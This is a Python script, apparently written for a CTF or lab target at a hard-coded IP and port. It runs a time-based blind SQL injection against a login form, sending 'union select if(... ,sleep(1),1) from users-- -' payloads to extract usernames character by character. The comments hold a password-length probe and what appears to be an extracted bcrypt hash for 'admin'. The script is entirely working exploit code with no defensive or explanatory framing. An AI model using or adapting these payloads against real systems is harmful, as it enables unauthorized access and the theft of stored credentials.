import string
import requests
from time import sleep
a = string.printable

url = "http://83.136.250.24:39759"
# data = {
#     #"username":"'union select if(length(password)=60,sleep(3),1) from users-- -",
#     "username":"'union select if(ascii(substr(password,1,1))>90,sleep(3),1) from users-- -",
#     "password":"2"
# }
done = ""
for i in range(100):
    for j in a:
        data = {
        "username":f"'union select if(ascii(substr(username,{i},1))={ord(j)},sleep(1),1) from users-- -",
        #$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.|admin
        #i
        "password":"2"
        }
        r=requests.post(url,data=data)
        if r.elapsed.total_seconds() > 1:
            done+=j
            print(done)
        else:
            print(f"{i}:{j}")
